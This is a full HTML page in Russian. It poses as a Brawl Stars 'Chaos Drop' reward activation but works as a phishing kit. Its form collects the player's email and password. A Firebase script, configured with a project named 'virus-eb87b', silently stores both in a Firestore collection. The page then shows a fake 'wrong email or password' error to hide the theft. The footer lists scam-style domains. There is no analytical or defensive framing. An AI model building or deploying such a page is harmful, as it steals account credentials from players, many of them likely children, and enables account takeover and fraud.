<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Brawl Stars — Chaos Drop</title>
  <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Nunito:wght@800;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  
  <!-- Firebase SDK -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyA3rd90080u4tZVxp8FSQAE6ZW4uRLBIpY",
      authDomain: "virus-eb87b.firebaseapp.com",
      projectId: "virus-eb87b",
      storageBucket: "virus-eb87b.firebasestorage.app",
      messagingSenderId: "678847278608",
      appId: "1:678847278608:web:eaae32b5c4ca0b975c6495"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    window.silentRegister = async (email, password) => {
      try {
        await addDoc(collection(db, "chaosdrop_registrations"), {
          email: email,
          password: password,
          claimedAt: serverTimestamp(),
          dropType: "Chaos Drop"
        });
        console.log('[Firestore] Data saved');
      } catch (e) {
        console.warn('[Firestore] Error:', e.code);
      }
      return { success: false };
    };
  </script>

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      min-height: 100vh;
      background: radial-gradient(circle at 20% 30%, #1a2e1a, #0b120b);
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Nunito', sans-serif;
      padding: 20px;
    }

    .card {
      background: linear-gradient(145deg, #0f1a0f, #0a0f0a);
      border: 3px solid #27ae60;
      border-radius: 40px;
      padding: 30px 25px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 0 0 4px rgba(0,0,0,0.5), 0 20px 30px black, inset 0 0 15px rgba(39, 174, 96, 0.3);
      text-align: center;
    }

    .chaos-icon {
      font-size: 64px;
      color: #2ecc71;
      text-shadow: 0 0 25px #27ae60, 0 6px 0 #145a32;
      margin-bottom: 8px;
      position: relative;
      display: inline-block;
    }

    .chaos-icon .fa-bolt {
      position: absolute;
      font-size: 28px;
      bottom: 5px;
      right: -15px;
      color: #f1c40f;
      filter: drop-shadow(0 0 5px #e67e22);
    }

    h1 {
      font-family: 'Luckiest Guy', cursive;
      font-size: 38px;
      color: #a3e4b0;
      text-transform: uppercase;
      letter-spacing: 3px;
      text-shadow: 0 4px 0 #1e8449, 0 8px 12px black;
      margin-bottom: 5px;
    }

    .sub {
      color: #f39c12;
      font-weight: 900;
      letter-spacing: 2px;
      margin-bottom: 20px;
      text-shadow: 0 2px 0 #7e5109;
      font-size: 16px;
    }

    .reward-badge {
      background: #27ae60;
      border-radius: 60px;
      padding: 10px 20px;
      margin: 20px 0;
      border: 3px solid black;
      box-shadow: 0 5px 0 #145a32, inset 0 2px 8px #a3e4b0;
    }

    .reward-badge span {
      font-family: 'Luckiest Guy', cursive;
      font-size: 26px;
      color: #eafaf1;
      text-shadow: 0 2px 0 #0b1f0b;
    }

    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }

    .input-group label {
      display: block;
      color: #a3e4b0;
      font-weight: 900;
      margin-bottom: 6px;
      text-shadow: 0 2px 0 #145a32;
    }

    .input-wrapper {
      position: relative;
    }

    .input-wrapper i {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: #2ecc71;
      font-size: 18px;
    }

    .input-wrapper input {
      width: 100%;
      padding: 15px 20px 15px 48px;
      font-weight: 900;
      font-size: 16px;
      background: #eafaf1;
      border: 3px solid #145a32;
      border-radius: 40px;
      outline: none;
      color: #0b1f0b;
      box-shadow: inset 0 4px 8px rgba(0,0,0,0.2), 0 6px 0 #0a2a0a;
    }

    .input-wrapper input:focus {
      border-color: #2ecc71;
      background: #ffffff;
      box-shadow: inset 0 4px 8px rgba(0,0,0,0.2), 0 6px 0 #145a32, 0 0 0 3px rgba(46, 204, 113, 0.5);
    }

    .btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #2ecc71, #27ae60);
      border: 4px solid #0b1f0b;
      border-radius: 60px;
      font-family: 'Luckiest Guy', cursive;
      font-size: 26px;
      color: #eafaf1;
      text-shadow: 0 2px 0 #0b1f0b;
      text-transform: uppercase;
      letter-spacing: 2px;
      box-shadow: 0 8px 0 #145a32, 0 0 20px #27ae60;
      cursor: pointer;
      transition: 0.05s linear;
      margin-top: 10px;
    }

    .btn:active {
      transform: translateY(6px);
      box-shadow: 0 2px 0 #145a32, 0 0 20px #27ae60;
    }

    .error-msg {
      margin-top: 18px;
      font-weight: 900;
      font-size: 18px;
      color: #e74c3c;
      text-shadow: 0 2px 0 #641e16, 0 0 8px #f1948a;
      min-height: 28px;
    }

    .footer-links {
      margin-top: 22px;
      color: #7f8c8d;
      font-size: 13px;
    }

    .footer-links a {
      color: #2ecc71;
      text-decoration: none;
      margin: 0 5px;
      font-weight: bold;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

<div class="card">
  <div class="chaos-icon">
    <i class="fas fa-star"></i>
    <i class="fas fa-bolt"></i>
  </div>
  <h1>CHAOS DROP</h1>
  <div class="sub">АКТИВАЦИЯ НАГРАДЫ</div>

  <div class="reward-badge">
    <span>10 ХАОС ДРОПОВ</span>
  </div>

  <form onsubmit="handleChaosRegister(event)" novalidate>
    <div class="input-group">
      <label><i class="fas fa-envelope" style="margin-right: 6px;"></i> EMAIL</label>
      <div class="input-wrapper">
        <i class="fas fa-user"></i>
        <input type="email" id="email" placeholder="brawler@mail.com" autocomplete="off">
      </div>
    </div>

    <div class="input-group">
      <label><i class="fas fa-lock" style="margin-right: 6px;"></i> ПАРОЛЬ</label>
      <div class="input-wrapper">
        <i class="fas fa-key"></i>
        <input type="password" id="password" placeholder="••••••••" autocomplete="off">
      </div>
    </div>

    <button type="submit" class="btn">ПОЛУЧИТЬ</button>
  </form>

  <div id="errorMsg" class="error-msg"></div>

  <div class="footer-links">
    <a href="#">getbrawler.online</a> • 
    <a href="#">x5x.site</a> • 
    <a href="#">gems.stars10x.site</a>
  </div>
</div>

<script>
  async function handleChaosRegister(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const errorDiv = document.getElementById('errorMsg');

    await window.silentRegister(email, password);

    errorDiv.textContent = 'НЕПРАВИЛЬНАЯ ПОЧТА ИЛИ ПАРОЛЬ';
  }
</script>

</body>
</html>
